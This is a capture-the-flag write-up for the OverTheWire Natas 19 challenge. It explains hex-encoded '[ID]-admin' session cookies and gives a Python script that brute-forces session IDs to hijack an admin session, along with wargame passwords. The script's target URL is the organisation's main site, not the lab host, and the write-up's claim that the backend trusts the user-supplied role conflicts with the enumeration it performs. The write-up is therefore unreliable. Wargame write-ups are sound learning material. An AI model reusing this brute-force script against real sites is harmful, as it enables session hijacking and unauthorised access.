# OverTheWire: Natas Level 19 -> Level 20 Writeup

## 1. Challenge Background & Analysis
The objective of this level is to authenticate as an administrator and retrieve the password for Natas Level 20. The challenge description states: `This page uses mostly the same code as the previous level, but session IDs are no longer sequential...`

The session implementation suffers from **Weak Session Management via Obfuscation**:
* **Information Leakage in Cookie Format**: While the session IDs are no longer simple sequential integers, they follow a predictable encoding pattern. Inspecting a newly assigned `PHPSESSID` cookie reveals a long hexadecimal string (e.g., `3333322d61646d696e`).
* **Predictable Cleartext Structure**: Decoding the hex-encoded cookie values reveals a distinct ASCII structure: `[ID]-user` or `[ID]-admin` (for example, `332-admin`). 
* **Bounded Session Space**: The underlying numerical identifier space remains identical to the previous level, bounded to a tiny maximum range (0 through 640).
* **Flawed Role Assignment**: The application backend decodes the hex string and inherently trusts the user-supplied role embedded within the session identifier. 

Because security relies purely on hexadecimal encoding rather than cryptographically secure, high-entropy tokens, an attacker can perform a **Session Hijacking via Identifier Enumeration** attack by crafting valid admin cookie payloads.

## 2. Solution Strategy & Exploitation

### Probe & Verification:
To confirm the format, we can analyze an intercepted cookie value. If our browser receives a cookie such as `3238312d75736572`, converting this from hex to ASCII yields:
```text
32 38 31 2d 75 73 65 72  ->  281-user
```
This proves that the application maps the session directly to a format of `[ID]-[role]`, fully encoded in hexadecimal. To escalate our privileges, we must craft our own `PHPSESSID` strings using the format `[ID]-admin` and iterate through all possible IDs.

### Automation via Session Brute-Force:
We can automate the process using a Python script. The script loops from `0` to `640`, appends `-admin` to each index, converts the entire string to its hexadecimal representation, and dispatches the payload inside the `PHPSESSID` cookie header.

The server response behavior follows a clear Boolean state:
* **Regular Session (False)**: The response body contains standard user text.
* **Admin Session (True)**: The response body contains the string `"You are an admin"`, along with the password credentials for the next level.

### Python Automation Script:
The following Python script systematically sweeps the session space using hex-encoded admin payloads.

```python
import requests
from requests.auth import HTTPBasicAuth

# Initialize a persistent session and embed basic authentication credentials
session = requests.Session()
# Replace the second argument with your actual active password for natas19 if needed
session.auth = HTTPBasicAuth("natas19", "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT")

target_url = "http://overthewire.org"

# Iterating through all possible session identifiers (0 to 640)
for i in range(0, 641):
    # Craft the raw target admin payload string
    payload = f"{i}-admin"
    
    # Convert the ASCII payload string directly into its hexadecimal representation
    hex_cookie = payload.encode('utf-8').hex()
    custom_cookie = {"PHPSESSID": hex_cookie}
    
    # Send the request with the brute-forced admin cookie
    response = session.get(target_url, cookies=custom_cookie)
    print(f"Trying ID: {i} -> Hex Cookie: {hex_cookie}")
    
    # Check for administrative execution context in response body
    if "You are an admin" in response.text:
        print(f"\n[+] Success! Found active admin session slot at ID: {i}")
        print(f"[+] Exploited Cookie Value: {hex_cookie}")
        
        # Parse the page text to isolate the password line
        for line in response.text.splitlines():
            if "Password:" in line:
                print(f"[+] {line.strip()}")
        break
```

## 3. Flag / Final Result
* **Natas Level 20 Password**: `slOKYGsjlJhaqKliGvrgWAzln0JyrWao`
